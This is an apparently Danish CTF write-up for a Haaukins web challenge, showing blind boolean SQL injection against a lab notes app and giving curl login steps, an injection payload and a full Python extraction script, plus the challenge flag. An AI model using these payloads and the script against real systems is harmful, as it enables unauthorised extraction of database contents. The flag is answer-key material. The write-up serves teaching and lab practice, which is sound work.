Hackable App part 2

"Blind guesses" = blind boolean SQL injection med et Good/Bad-orakel.

Web exploitationHaaukins CTF
🎓 Prøv selv først. Trinnene viser metoden, det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er fremgangsmåden der tæller.
📚 Baggrund: denne opgave bygger på en fælles teknik. Læs primeren: Kom i gang: VPN, Hosts og lab-opsætning.

Hvad går opgaven ud på?

En notes-app (hackable2.hkn) med /guessnotes ("guess a private note of a given user", felter user_name+note, svar "Good Guess"/"Bad Guess"). "Blind guesses" = blind boolean SQLi (SQLite).

Opret en konto først

Appen kræver login. /guessnotess user_name-felt skal matche en eksisterende bruger, ellers kortslutter logikken før din injektion overhovedet når query'en, så registrér dig og brug dit eget brugernavn som ankeret:

curl -c cookies.txt -d 'username=pwntester&password=test123' http://hackable2.hkn/register
curl -b cookies.txt -c cookies.txt -d 'username=pwntester&password=test123' http://hackable2.hkn/login

Exploit

Query'en bag /guessnotes er ca. ... WHERE user_name='<user>' AND note='<note>'. Injicér i note-feltet med dit eget (ægte) brugernavn i user_name:

user_name=pwntester  note=zzz' OR (<condition>) --    # "Good Guess" hvis condition er sand

Bekræft først at flaget overhovedet er en note: (SELECT 1 FROM notes WHERE note LIKE '%HKN{%') → "Good Guess" bekræfter det. Ekstrahér det derefter tegn-for-tegn med binær søgning (~7 requests pr. tegn, fordi ASCII er 7 bit):

import requests

S = requests.Session()
S.post("http://hackable2.hkn/register", data={"username": "pwntester", "password": "test123"})
S.post("http://hackable2.hkn/login", data={"username": "pwntester", "password": "test123"})
SUB = "(SELECT note FROM notes WHERE note LIKE '%HKN{%' LIMIT 1)"

def ask(condition):
    note = f"zzz' OR ({condition}) --"
    r = S.post("http://hackable2.hkn/guessnotes", data={"user_name": "pwntester", "note": note})
    return "Good Guess" in r.text

# find flagets længde med binær søgning
lo, hi = 0, 128
while lo < hi:
    mid = (lo + hi) // 2
    if ask(f"length({SUB}) > {mid}"):
        lo = mid + 1
    else:
        hi = mid
length = lo

flag = ""
for i in range(1, length + 1):
    lo, hi = 0, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if ask(f"unicode(substr({SUB},{i},1)) > {mid}"):
            lo = mid + 1
        else:
            hi = mid
    flag += chr(lo)
    print(flag)
🚩 Vis løsning & eksempel-flag

Flag: HKN{p4ran0ia_mak3s_y0u_go0d_a7_gue5s1ng_g4me5}

Hvad du har lært

  • Blind boolean SQLi: et binært orakel (Good/Bad) + substr/unicode/length giver fuld ekstraktion.
  • Fælde: injektionsfeltet når kun query'en hvis det ANDET felt (user_name) matcher en rigtig bruger.
  • Jf. UNION-varianten i Sneaky Reviews; her er output blindt.

Hvor ses dette igen?

Blind injection er UNION-SQLi's tålmodige fætter: du ser ikke dataene, kun et ja/nej-signal ("Good"/"Bad", eller en tidsforskel ved time-based blind). Men ét bit information pr. request er nok: med substr + unicode + binær søgning udtrækker du hvert tegn på ~7 forespørgsler. Det er langsomt nok til at sqlmap som regel automatiserer det, men at kunne det i hånden lærer dig præcis hvorfor et orakel, uanset hvor lille, lækker alt til sidst. Samme princip som Hashle og padding-oracles: lidt feedback pr. forsøg, gentaget, afslører helheden.
